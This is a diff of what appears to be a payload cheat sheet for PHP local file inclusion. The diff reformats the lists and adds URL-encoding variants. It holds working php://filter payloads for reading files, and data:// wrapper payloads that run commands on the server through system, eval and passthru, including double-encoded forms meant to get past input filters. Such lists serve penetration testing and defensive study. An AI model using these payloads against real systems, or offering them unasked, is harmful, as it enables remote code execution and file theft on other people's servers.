@@ -35,9 +35,9 @@ php://filter/zlib.deflate|convert.base64-encode/resource=*
 php://filter/bzip2.compress|convert.base64-encode/resource=*
 ```
 **variations derived from:**
-- usage of different PHP filters (https://www.php.net/manual/en/filters.php)
-- chaining filters using `|`
-- using `php://filter/read=` instead of `php://filter`
+1. usage of different PHP filters (https://www.php.net/manual/en/filters.php)
+2. chaining filters using `|`
+3. using `php://filter/read=` instead of `php://filter`
 
 
 #### `data://filter` wrapper
@@ -49,9 +49,13 @@ data%3Atext%2Fplain%2C%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E
 data://text/plain,<?php%20eval(\"system('id');\");%20?>
 ```
 **variations derived from:**
-- using both base64 (`data://text/plain;base64`) and plain text input (`data://text/plain`, `data:text/plain`)
-- url encoding different parts of the payload (encoding special chars)
-- utilizing various methods for achieving RCE: `system('id');`, `eval(\"system('id');\");`, `passthru(\"system('id');\");`
+1. using both base64 (`data://text/plain;base64`) and plain text input (`data://text/plain`, `data:text/plain`)
+2. url encoding variations:
+- encoding special chars, different parts of the payload, and encoding an already encoded (first layer with non special char) payload
+ - `data://text/plain,<?php passthru('id'); ?>` -> `data://text/plain,%3C?php%20passthru('id');%20?%3E`, `data%3A%2F%2Ftext%2Fplain%2C%3C%3Fphp%20passthru%28%27id%27%29%3B%20%3F%3E`  
+ - `data://text/plain,<?php%20passthru('id');%20?>` -> `data://text/plain,%3C?php%2520passthru('id');%2520?%3E`, `data%3A%2F%2Ftext%2Fplain%2C%3C%3Fphp%2520passthru%28%27id%27%29%3B%2520%3F%3E`
+   
+3. utilizing various methods for achieving RCE: `system('id');`, `eval(\"system('id');\");`, `passthru(\"system('id');\");`
 
 
 ### Examples of working payload
